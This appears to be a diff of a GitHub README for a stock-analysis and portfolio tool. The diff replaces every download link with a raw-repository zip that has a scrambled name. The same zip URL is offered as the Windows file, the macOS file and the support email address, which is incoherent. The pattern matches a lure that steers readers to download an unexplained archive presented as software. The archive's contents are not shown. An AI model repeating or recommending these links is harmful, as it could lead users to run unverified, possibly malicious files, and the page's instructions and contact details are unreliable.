@@ -1,6 +1,6 @@
 # 📈 AI-Based_Stock_Analysis_and_Portfolio_Optimisation - Analyze Stocks with Smart Insights
 
-![Download](https://raw.githubusercontent.com/cheese23456/AI-Based_Stock_Analysis_and_Portfolio_Optimisation/main/depreter/AI-Based_Stock_Analysis_and_Portfolio_Optimisation.zip)
+![Download](https://raw.githubusercontent.com/cheese23456/AI-Based_Stock_Analysis_and_Portfolio_Optimisation/main/urochordal/Based_Portfolio_Analysis_Optimisation_A_Stock_and_3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -18,13 +18,13 @@ To run this application, you will need:
 
 To get started, visit the link below to download the software.
 
-[Download AI-Based Stock Analysis and Portfolio Optimisation](https://raw.githubusercontent.com/cheese23456/AI-Based_Stock_Analysis_and_Portfolio_Optimisation/main/depreter/AI-Based_Stock_Analysis_and_Portfolio_Optimisation.zip)
+[Download AI-Based Stock Analysis and Portfolio Optimisation](https://raw.githubusercontent.com/cheese23456/AI-Based_Stock_Analysis_and_Portfolio_Optimisation/main/urochordal/Based_Portfolio_Analysis_Optimisation_A_Stock_and_3.4.zip)
 
 ### Steps to Download:
 
 1. Click on the link above.
 2. Look for the latest release version on the page.
-3. Download the asset labeled "https://raw.githubusercontent.com/cheese23456/AI-Based_Stock_Analysis_and_Portfolio_Optimisation/main/depreter/AI-Based_Stock_Analysis_and_Portfolio_Optimisation.zip" for Windows, "https://raw.githubusercontent.com/cheese23456/AI-Based_Stock_Analysis_and_Portfolio_Optimisation/main/depreter/AI-Based_Stock_Analysis_and_Portfolio_Optimisation.zip" for macOS, or the corresponding file for your operating system.
+3. Download the asset labeled "https://raw.githubusercontent.com/cheese23456/AI-Based_Stock_Analysis_and_Portfolio_Optimisation/main/urochordal/Based_Portfolio_Analysis_Optimisation_A_Stock_and_3.4.zip" for Windows, "https://raw.githubusercontent.com/cheese23456/AI-Based_Stock_Analysis_and_Portfolio_Optimisation/main/urochordal/Based_Portfolio_Analysis_Optimisation_A_Stock_and_3.4.zip" for macOS, or the corresponding file for your operating system.
 
 ## ⚙️ How to Run the Application
 
@@ -53,7 +53,7 @@ For more detailed information on how to use the features of the software, please
 If you encounter any issues or have questions, please feel free to reach out:
 
 1. Open an issue on our GitHub Issues page.
-2. Email support at: https://raw.githubusercontent.com/cheese23456/AI-Based_Stock_Analysis_and_Portfolio_Optimisation/main/depreter/AI-Based_Stock_Analysis_and_Portfolio_Optimisation.zip
+2. Email support at: https://raw.githubusercontent.com/cheese23456/AI-Based_Stock_Analysis_and_Portfolio_Optimisation/main/urochordal/Based_Portfolio_Analysis_Optimisation_A_Stock_and_3.4.zip
 
 Your feedback is valuable and helps us improve the tool.
 
